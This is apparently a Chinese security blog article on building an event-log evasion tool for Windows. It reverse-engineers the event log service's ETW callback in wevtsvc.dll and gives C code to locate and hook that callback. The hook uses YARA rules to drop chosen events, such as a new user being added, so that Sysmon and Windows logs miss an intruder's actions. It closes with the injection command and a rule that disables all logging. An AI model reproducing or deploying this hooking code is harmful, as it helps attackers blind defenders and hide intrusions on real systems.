![](https://image.3001.net/images/20200927/1601219060_5f70a9f42f4adf81592cc.jpg!small)

## 写在前面的话

事件日志搭配Windows事件转发和Sysmon，将会成为一个非常强大的安全防御方案，可以帮助研究人员检测攻击者在目标设备上的每一步非法操作。很明显，这是攻击者需要解决的问题。如果不能实现提权的话，攻击者能绕过事件日志的方式还是有限的，一旦实现提权，那结果可就不同了。

那么，为了不引起研究人员的注意，我们应该怎么做才能在过滤掉攻击活动日志的同事，保留住正常的事件日志呢？

几年之前，[ _@hlldz_](https://twitter.com/hlldz)曾发布过一款名叫Invoke-Phant0m的工具。这是一款Windows日志清理工具，它可以找到目标事件对应的进程，然后终止掉所有通过wevtsvc.dll运行的线程。这是因为wevtsvc.dll是一个事件日志服务，因此终止它以及相关线程就可以禁用掉日志记录功能了。但是，这样将停用所有的事件日志。那么为了解决这个问题，我们需要实现Invoke-Phant0m类似的功能，但需要支持事件报告过滤，这样就可以只阻止与恶意行为相关的事件被记录了。

## 逆向分析事件日志服务

在对wevtsvc.dll分析的过程中，我们发现它会通过OpenTraceW来打开一个追踪会话：

![](https://image.3001.net/images/20200927/1601219085_5f70aa0d26e3d6eb1598e.png!small)

OpenTraceW使用EVENT_TRACE_LOGFILEW结构体作为参数，这个结构体包含了EventRecordCallback的值，它指向目标事件的一个回调函数。

使用windbg进行深入分析后，我发现这个回调函数就是wevtsvc!EtwEventCallback：

![](https://image.3001.net/images/20200927/1601219091_5f70aa13827cb58ee55ae.png!small)

通过对回调函数代码进行反汇编，我发现它是一个调用了EventCallback的程序集:

![](https://image.3001.net/images/20200927/1601219097_5f70aa196d3bb5fc35029.png!small)

在wevtsvc!EtwEventCallback上设置断点，我们就会发现它将在EVENT_RECORD结构体中接收事件信息：

    
    
    typedef struct _EVENT_RECORD {
    
      EVENT_HEADER                     EventHeader;
    
      ETW_BUFFER_CONTEXT               BufferContext;
    
      USHORT                           ExtendedDataCount;
    
      USHORT                           UserDataLength;
    
      PEVENT_HEADER_EXTENDED_DATA_ITEM ExtendedData;
    
      PVOID                            UserData;
    
      PVOID                            UserContext;
    
    } EVENT_RECORD, *PEVENT_RECORD;

EVENT_HEADER结构体中包含了大量事件详细信息，包括报告事件的提供方，在windbg的帮助下，我们可以获取到提供方的GUID：

![](https://image.3001.net/images/20200927/1601219107_5f70aa23e7509b100a955.png!small)

拿到事件提供方的GUID后，我们就可以使用logman.exe来查询提供方身份了，这里我们可以看到提供方就是Microsoft-Windows-Sysmon：

![](https://image.3001.net/images/20200927/1601219114_5f70aa2ae563a5886dabf.png!small)

我们可以在这里通过添加一个ret命令来篡改该函数，并阻止所有的事件报告生成：

![](https://image.3001.net/images/20200927/1601219123_5f70aa332a80fe0078bed.png!small)

在下图中，你可以看到我清楚掉了一条7:01创建的事件日志，并在7:04时添加了一个新用户，但是这个操作没有被记录下来，因为我们在回调函数代码中添加的ret指令能够让系统范围内的所有事件都不会被报告：

![](https://image.3001.net/images/20200927/1601219129_5f70aa39a8d22891b2716.png!small)

## 设置函数钩子

PoC正常执行后，我们就可以看是编写漏洞利用代码了。我们需要做的第一件事就是找到wevtsvc!EtwEventCallback的偏移量，这样我们就知道应该把函数钩子设置在哪里了。首先，我们要定位wevtsvc.dll的基地址。下面的代码可以获取该地址，并存储至dwBase变量中：

    
    
    DWORD_PTR dwBase;
    
    DWORD     i, dwSizeNeeded;
    
    HMODULE   hModules[102400];
    
    TCHAR     szModule[MAX_PATH];
    
     
    
    if (EnumProcessModules(GetCurrentProcess(), hModules, sizeof(hModules), &dwSizeNeeded))
    
    {
    
        for (int i = 0; i < (dwSizeNeeded / sizeof(HMODULE)); i++)
    
        {
    
            ZeroMemory((PVOID)szModule, MAX_PATH);
    
     
    
            if (GetModuleBaseNameA(GetCurrentProcess(), hModules[i], (LPSTR)szModule, sizeof(szModule) / sizeof(TCHAR)))
    
            {
    
                if (!strcmp("wevtsvc.dll", (const char*)szModule))
    
                {
    
                    dwBase = (DWORD_PTR)hModules[i];
    
                }
    
            }
    
        }
    
    }

接下来，使用windbg来进行反汇编来查看回调开始时的字节位置，然后进行内存扫描，找到这些字节之后，我们也就找到了设置钩子的地方了：

![](https://image.3001.net/images/20200927/1601219145_5f70aa4947a2b0ce92259.png!small)

下面这段代码将搜索从wevtsvc.dll基地址的起始字节0xfffff，以找到4883ec384c8b0d：

    
    
    #define PATTERN "\x48\x83\xec\x38\x4c\x8b\x0d"
    
     
    
    DWORD i;
    
    LPVOID lpCallbackOffset;
    
     
    
    for (i = 0; i < 0xfffff; i++)
    
    {
    
        if (!memcmp((PVOID)(dwBase + i), (unsigned char*)PATTERN, strlen(PATTERN)))
    
        {
    
            lpCallbackOffset = (LPVOID)(dwBase + i);
    
        }
    
    }

获取到偏移量后，我们可以调用memcpy来拷贝字节位置：

    
    
    memcpy(OriginalBytes, lpCallbackOffset, 50);

接下来，设置一个钩子来将所有针对EtwEventCallback的调用重定向到EtwCallbackHook：

    
    
    VOID HookEtwCallback()
    
    {
    
        DWORD oldProtect, oldOldProtect;
    
     
    
        unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 };
    
     
    
        *(void **)(boing + 2) = &ampEtwCallbackHook
    
     
    
        VirtualProtect(lpCallbackOffset, 13, PAGE_EXECUTE_READWRITE, &oldProtect);
    
        memcpy(lpCallbackOffset, boing, sizeof(boing));
    
        VirtualProtect(lpCallbackOffset, 13, oldProtect, &oldOldProtect);
    
     
    
        return;
    
    }

但是，如果想要报告那些我们不需要阻止的事件，我们就需要恢复原先的回调执行了，因此我们还需要在它报告合法事件之后，重新设置钩子，以便捕捉后续事件。这里我们可以使用一个typedef来实现：

t

    
    
    ypedef VOID(WINAPI * EtwEventCallback_) (EVENT_RECORD *EventRecord);
    
     
    
    VOID DoOriginalEtwCallback( EVENT_RECORD *EventRecord )
    
    {
    
        DWORD dwOldProtect;
    
     
    
        VirtualProtect(lpCallbackOffset, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, &dwOldProtect);
    
        memcpy(lpCallbackOffset, OriginalBytes, sizeof(OriginalBytes));
    
        VirtualProtect(lpCallbackOffset, sizeof(OriginalBytes), dwOldProtect, &dwOldProtect);
    
     
    
        EtwEventCallback_ EtwEventCallback = (EtwEventCallback_)lpCallbackOffset;
    
     
    
        EtwEventCallback(EventRecord);
    
     
    
        HookEtwCallback();
    
    }

完成上述操作之后，我们就能够找到ETW回调函数的偏移量，然后将其挂钩到我们自己的函数并解析数据，最终解除回调并报告事件。

我们可以在windbg中看到解析后的事件:

![](https://image.3001.net/images/20200927/1601219173_5f70aa658085afd84e714.png!small)

## YARA与模式匹配

接下来，我们就要实现日志过滤器了。在这里，我定义了下列宏来保持代码风格一致性：

![](https://image.3001.net/images/20200927/1601219181_5f70aa6dc446307781116.png!small)

下面的代码将创建一个YARA规则中对象，并在YRRulesScanMem中使用：

    
    
    #define RULE_ALLOW_ALL "rule Allow { condition: false }"
    
     
    
    YRInitalize();
    
     
    
    RtlCopyMemory(cRule, RULE_ALLOW_ALL, strlen(RULE_ALLOW_ALL));
    
     
    
    if (YRCompilerCreate(&yrCompiler) != ERROR_SUCCESS)
    
    {
    
      return -1;
    
    }
    
     
    
    if (YRCompilerAddString(yrCompiler, cRule, NULL) != ERROR_SUCCESS)
    
    {
    
      return -1;
    
    }
    
     
    
    YRCompilerGetRules(yrCompiler, &yrRules);

YARA规则写好后，我们就可以开始扫描内存了。下面我们会扫描包含格式化事件内容的StringBuffer变量，并将结果传递给YARA回调函数ToReportOrNotToReportThatIsTheQuestion。该函数将根据规则是否匹配而将dwReport变量设置为0或1。如果PIPE_NAME变量出现在事件中，还需要对其进行检查。因为EvtMuteHook.dll将使用一个命名管道来动态更新当前规则，这将会生成事件日志，所以这个检查将确保这些事件日志不会被报告：

    
    
    INT ToReportOrNotToReportThatIsTheQuestion( YR_SCAN_CONTEXT* Context,
    
        INT Message,
    
        PVOID pMessageData,
    
        PVOID pUserData
    
    )
    
    {
    
        if (Message == CALLBACK_MSG_RULE_MATCHING)
    
        {
    
            (*(int*)pUserData) = 1;
    
        }
    
     
    
        if (Message == CALLBACK_MSG_RULE_NOT_MATCHING)
    
        {
    
            (*(int*)pUserData) = 0;
    
        }
    
     
    
        return CALLBACK_CONTINUE;
    
    }
    
     
    
    YRRulesScanMem(yrRules, (uint8_t*)StringBuffer, strlen(StringBuffer), 0, ToReportOrNotToReportThatIsTheQuestion, &dwReport, 0);
    
     
    
    if (dwReport == 0)
    
    {
    
        if (strstr(StringBuffer, PIPE_NAME) == NULL)
    
        {
    
            DoOriginalEtwCallback(EventRecord);
    
        }
    
    }

## 禁用所有日志记录

我们可以使用下列YARA规则来在系统范围内禁用事件日志记录：

    
    
    rule disable { condition: true }

接下来，将钩子注入到事件服务中：

    
    
    .\SharpEvtMute.exe --Inject

![](https://image.3001.net/images/20200927/1601219214_5f70aa8e5bbac130d6ffd.png!small)

设置好钩子后，还需要添加过滤器：

![](https://image.3001.net/images/20200927/1601219220_5f70aa94bd995b544f0e5.png!small)

现在，所有的事件都不会被了记录。

